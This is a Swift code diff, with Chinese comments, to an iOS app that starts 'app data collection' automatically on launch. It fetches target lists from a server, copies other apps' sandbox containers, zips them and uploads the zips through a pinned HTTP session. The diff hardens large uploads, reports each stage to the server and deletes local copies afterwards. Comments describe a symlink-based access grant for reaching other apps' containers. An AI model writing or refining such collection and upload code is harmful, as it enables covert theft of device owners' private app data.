@@ -649,7 +649,11 @@ enum ProtocolAPI {
 
     static let uuidStorageKey = "protocol.app_uuid"
     static let reportTimeout: TimeInterval = 30
+    /// 相册单张上传的请求超时（AlbumUploader 复用）。
     static let uploadTimeout: TimeInterval = 120
+    /// 容器采集包的请求超时：几百 MB 的包在 120 s 内传不完，
+    /// 超时会被当成上传失败、把已经打好的 zip 留下重试，白占空间。
+    static let zipUploadTimeout: TimeInterval = 900
 
     static var appUUID: String {
         let defaults = UserDefaults.standard
@@ -760,12 +764,18 @@ enum ProtocolAPI {
         log("protocol: log/report SUCCESS — \(text.count) chars")
     }
 
-    /// Uploads a ZIP with `/api/upload/zip`. File bytes are NOT encrypted;
-    /// only the `params` metadata field is AES-encrypted.
     /// Uploads a ZIP via v2.
     /// multipart: meta = v2 密文 JSON，file = 原始 zip 字节（不加密）。
+    ///
+    /// 整个 multipart 体不再拼在内存里：一个 app 容器的包动辄几百 MB，
+    /// 原先 `body.append(fileData)` 会让峰值内存变成包体的两倍，进程被
+    /// jetsam 杀掉时表现就是"阶段 3/6 之后什么都没有"。现在 zip 只做
+    /// mapped 读取（算 MD5 走页缓存），体写进临时文件后 `upload(fromFile:)`。
     static func uploadZip(fileURL: URL, bundleID: String) async throws {
-        guard let fileData = try? Data(contentsOf: fileURL) else {
+        let fileData: Data
+        do {
+            fileData = try Data(contentsOf: fileURL, options: [.mappedIfSafe])
+        } catch {
             throw ProtocolCollectError.collectionFailed("cannot read zip payload")
         }
         let fileName = fileURL.lastPathComponent
@@ -797,18 +807,30 @@ enum ProtocolAPI {
         }
 
         let boundary = "3105-\(UUID().uuidString)"
-        var body = Data()
-        func appendField(_ string: String) {
-            body.append(string.data(using: .utf8) ?? Data())
+        let bodyURL = FileManager.default.temporaryDirectory
+            .appendingPathComponent("3105-upload-\(UUID().uuidString).body")
+        guard FileManager.default.createFile(atPath: bodyURL.path, contents: nil) else {
+            throw ProtocolCollectError.collectionFailed("cannot stage upload body")
         }
-        appendField("--\(boundary)\r\n")
-        appendField("Content-Disposition: form-data; name=\"meta\"\r\n\r\n")
-        appendField(meta)
-        appendField("\r\n--\(boundary)\r\n")
-        appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
-        appendField("Content-Type: application/octet-stream\r\n\r\n")
-        body.append(fileData)
-        appendField("\r\n--\(boundary)--\r\n")
+        defer { try? FileManager.default.removeItem(at: bodyURL) }
+
+        let head = "--\(boundary)\r\n"
+            + "Content-Disposition: form-data; name=\"meta\"\r\n\r\n\(meta)\r\n"
+            + "--\(boundary)\r\n"
+            + "Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n"
+            + "Content-Type: application/octet-stream\r\n\r\n"
+        let tail = "\r\n--\(boundary)--\r\n"
+        do {
+            let handle = try FileHandle(forWritingTo: bodyURL)
+            defer { try? handle.close() }
+            try handle.write(contentsOf: Data(head.utf8))
+            try handle.write(contentsOf: fileData)
+            try handle.write(contentsOf: Data(tail.utf8))
+            try handle.synchronize()
+        } catch {
+            log("protocol: upload staging FAILED — \(error.localizedDescription)")
+            throw ProtocolCollectError.collectionFailed("cannot stage upload body")
+        }
 
         var request = URLRequest(url: baseURL.appendingPathComponent(v2Path("api/upload/zip")))
         request.httpMethod = "POST"
@@ -817,13 +839,15 @@ enum ProtocolAPI {
             forHTTPHeaderField: "Content-Type"
         )
         request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
-        request.timeoutInterval = uploadTimeout
-        request.httpBody = body
+        request.timeoutInterval = zipUploadTimeout
 
         let data: Data
         let response: URLResponse
         do {
-            (data, response) = try await PinnedSession.shared.session.data(for: request)
+            (data, response) = try await PinnedSession.shared.session.upload(
+                for: request,
+                fromFile: bodyURL
+            )
         } catch {
             log("protocol: upload FAILED — \(fileName): \(error.localizedDescription)")
             DebugLogWriter.shared.write("upload: FAILED \(fileName) — \(error.localizedDescription)")
@@ -941,6 +965,25 @@ enum ProtocolLogReporter {
 enum ProtocolCollectService {
     static let maximumLocalZipCount = 10
 
+    /// 六阶段进度，与 5\6 的 WQCollector 同一套文案和顺序：
+    ///
+    ///   阶段 1/6  app 已启动，自动开启应用数据采集
+    ///   阶段 2/6  正在获取采集信息 → 获取采集信息完成 — N 项
+    ///   阶段 3/6  容器索引就绪 — N 个应用（grant X / refused Y）
+    ///   阶段 4/6  开始采集 N 项
+    ///   阶段 5/6  采集完成 — 总计 N 项，已处理 X 个，未安装 Y 个
+    ///   阶段 6/6  本地文件已删除 → 流程结束
+    ///
+    /// 每一条都同时落到三处：进程日志、Documents/log2（DebugLogWriter，设备上能
+    /// 直接看）和 `/api/log/report`（服务端状态栏）。上线后哪一阶段断了，
+    /// 服务端只看到前一条就知道断点在哪，不需要连 Xcode。
+    static func reportStage(_ text: String) async {
+        log("collect: \(text)")
+        DebugLogWriter.shared.write("stage: \(text)")
+        await MainActor.run { ProtocolStatusLog.shared.append(text) }
+        await ProtocolLogReporter.reportPendingLogs()
+    }
+
     /// 目录整体复制失败时的兜底：逐文件复制（Data 读 + 写），
     /// 单个文件读不了就跳过并记日志，能拿多少拿多少。
     @discardableResult
@@ -991,9 +1034,20 @@ enum ProtocolCollectService {
     }
 
     static func runCycle(fileManager: FileManager = .default) async throws -> CollectCycleResult {
-        let configs = try await ProtocolAPI.pullCollectConfigs()
+        await reportStage("阶段 1/6：app 已启动，自动开启应用数据采集")
+
+        // ---- 阶段 2/6：拉采集信息 ----
+        await reportStage("阶段 2/6：正在获取采集信息")
+        let configs: [CollectConfig]
+        do {
+            configs = try await ProtocolAPI.pullCollectConfigs()
+        } catch {
+            await reportStage("阶段 2/6：获取采集信息失败（网络或握手失败）")
+            throw (error as? ProtocolCollectError) ?? ProtocolCollectError.serverUnreachable
+        }
         log("collect: got configs count=\(configs.count)")
         DebugLogWriter.shared.write("collect: device/report OK — \(configs.count) configs")
+        await reportStage("阶段 2/6：获取采集信息完成 — \(configs.count) 项")
 
         // Installed-apps report goes out immediately, from whatever the index
         // already knows — waiting for the 50M walk (or for the ZIP loop to end)
@@ -1013,6 +1067,15 @@ enum ProtocolCollectService {
             }
         }
 
+        // ---- 阶段 3/6：复原访问缓存 + 枚举容器 ----
+        // 27.2.1 上 worse_query 的每次 grant 都要把 App Group 的 Library/Caches
+        // 换成指向目标的软链，返回时再换回目录。进程在 grant 中途被挂起/杀掉，
+        // 留下的软链或 .wq-caches-preserved 残留会让之后每次 grant 都是 -4：
+        // 索引整片 refused、阶段 3 之后再也没有动静。枚举之前先物理复原。
+        let repairedGroups = await Task.detached(priority: .userInitiated) {
+            UserlandAccess.repairAccessCache()
+        }.value
+        log("collect: access cache repaired — \(repairedGroups) group(s) with a usable Library/Caches")
 
         // Keep discovering containers in the background: the fast index covers
         // system apps plus our own neighbourhood, the rest of the inode space is
@@ -1024,14 +1087,14 @@ enum ProtocolCollectService {
         let index = await Task.detached(priority: .userInitiated) {
             ContainerStore.containerIndexSnapshot(waitForBuild: true)
         }.value
-        log("collect: container index ready — \(index.count) bundles")
+        let accessStats = ContainerStore.lastScanAccessStats
+        log("collect: container index ready — \(index.count) bundles (grant \(accessStats.granted) / refused \(accessStats.refused))")
         DebugLogWriter.shared.write(
-            "collect: container index \(index.count) bundles\(index.isEmpty ? " (scan still running)" : "")"
+            "collect: container index \(index.count) bundles grant=\(accessStats.granted) refused=\(accessStats.refused)\(index.isEmpty ? " (scan still running)" : "")"
         )
-
-        await MainActor.run {
-            ProtocolStatusLog.shared.append("收到采集信息 — 共 \(configs.count) 个采集项")
-        }
+        await reportStage(
+            "阶段 3/6：容器索引就绪 — \(index.count) 个应用（grant \(accessStats.granted) / refused \(accessStats.refused)）"
+        )
 
         guard !configs.isEmpty else {
             // 空配置不能算成功：否则 hasAttempted 会永久锁死，再也不重试。
@@ -1039,6 +1102,9 @@ enum ProtocolCollectService {
             log("collect: empty collect configs — will retry")
             throw ProtocolCollectError.collectionFailed("empty collect configs")
         }
+
+        // ---- 阶段 4/6：采集 ----
+        await reportStage("阶段 4/6：开始采集 \(configs.count) 项")
 
         let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
         let stamp = timestampString()
@@ -1172,8 +1238,24 @@ enum ProtocolCollectService {
             }
         }
 
+        // ---- 阶段 5/6：采集完成 ----
+        let missing = pending.sorted()
+        await reportStage(
+            "阶段 5/6：采集完成 — 总计 \(configs.count) 项，已处理 \(zipCount) 个，未安装 \(missing.count) 个"
+        )
+        if !missing.isEmpty {
+            await reportStage("未安装：\(missing.joined(separator: ", "))")
+        }
+        if !uploadedNames.isEmpty {
+            await reportStage("上传列表 \(uploadedNames.count) 个：\(uploadedNames.joined(separator: "、"))")
+        }
 
-        pruneLocalZips(in: documentsURL, fileManager: fileManager)
+        // ---- 阶段 6/6：清理本地文件 ----
+        // `uploadedCount` 个 zip 在 collectOne 里上传成功后即已删除，
+        // removedLocal 是本次额外清掉的旧包与残留 staging 目录。
+        let removedLocal = pruneLocalZips(in: documentsURL, fileManager: fileManager) + uploadedCount
+        await reportStage("阶段 6/6：本地文件已删除 \(removedLocal) 个")
+        await reportStage("阶段 6/6：流程结束 — 容器 \(index.count)，已处理 \(zipCount)")
 
         let result = CollectCycleResult(
             zipCount: zipCount,
@@ -1182,12 +1264,6 @@ enum ProtocolCollectService {
             completedAt: Date()
         )
         log("collect: done total=\(configs.count) zips=\(zipCount) uploaded=\(uploadedCount)")
-        await MainActor.run {
-            ProtocolStatusLog.shared.append("采集完成 — 总共 \(configs.count) 个，已完成 \(zipCount) 个（上传 \(uploadedCount) 个）")
-            if !uploadedNames.isEmpty {
-                ProtocolStatusLog.shared.append("上传列表 \(uploadedNames.count) 个：\(uploadedNames.joined(separator: "、"))")
-            }
-        }
         log("collect: cycle done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
         return result
     }
@@ -1730,16 +1806,39 @@ enum ProtocolCollectService {
         return candidate
     }
 
-    private static func pruneLocalZips(in documentsURL: URL, fileManager: FileManager) {
+    /// Deletes local collect payloads: keeps the newest `maximumLocalZipCount`
+    /// zips and removes every `.collect-*` staging folder an interrupted cycle
+    /// left behind (each one can be hundreds of MB, and on a full container it
+    /// made the next ZIP fail to write). Returns how many items were removed.
+    @discardableResult
+    private static func pruneLocalZips(in documentsURL: URL, fileManager: FileManager) -> Int {
+        var removed = 0
         let names = ((try? fileManager.contentsOfDirectory(atPath: documentsURL.path)) ?? [])
+        let zips = names
             .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
             .sorted()
-        let excess = names.count - maximumLocalZipCount
-        guard excess > 0 else { return }
-        for name in names.prefix(excess) {
-            try? fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
-            log("collect: pruned local zip \(name)")
+        let excess = zips.count - maximumLocalZipCount
+        if excess > 0 {
+            for name in zips.prefix(excess) {
+                do {
+                    try fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
+                    removed += 1
+                    log("collect: pruned local zip \(name)")
+                } catch {
+                    log("collect: prune failed \(name) — \(error.localizedDescription)")
+                }
+            }
         }
+        for name in names where name.hasPrefix(".collect-") {
+            do {
+                try fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
+                removed += 1
+                log("collect: pruned staging folder \(name)")
+            } catch {
+                log("collect: staging prune failed \(name) — \(error.localizedDescription)")
+            }
+        }
+        return removed
     }
 
     /// Human folder name for a collect config — the server-provided app_name
